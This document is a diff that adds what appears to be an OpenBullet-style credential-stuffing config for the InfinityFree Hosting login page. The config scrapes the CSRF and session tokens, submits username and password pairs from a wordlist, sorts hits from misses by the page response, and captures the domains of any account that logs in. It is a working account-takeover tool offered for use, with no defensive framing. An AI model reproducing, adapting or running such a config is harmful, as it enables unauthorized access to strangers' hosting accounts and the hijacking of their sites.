@@ -1,0 +1,47 @@
+[SETTINGS]
+{
+  "Name": "InfinityFree Hosting",
+  "SuggestedBots": 1,
+  "LastModified": "2018-10-03T00:25:38.8296703+00:00",
+  "AdditionalInfo": "",
+  "Author": "TomKirkman",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://app.infinityfree.net/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "text/html; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://app.infinityfree.net/login" 
+PARSE "<COOKIES(XSRF-TOKEN)>" LR "" "" Recursive=FALSE -> VAR "token" "" "" 
+PARSE "<COOKIES(infinityfree_session)>" LR "" "" Recursive=FALSE -> VAR "ses" "" "" 
+PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"_token\" value=\"" "\">" Recursive=FALSE -> VAR "TOKENPOST" "" "" 
+REQUEST POST "https://app.infinityfree.net/login" AutoRedirect=TRUE 
+  CONTENT "email=<USER>&password=<PASS>&_token=<TOKENPOST>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "These credentials do not match our records" 
+  KEYCHAIN Success OR 
+    KEY "<span>Logout</span>" 
+PARSE "<SOURCE>" LR "Website for " "</div>" Recursive=TRUE -> CAP "Domains" "" "" 
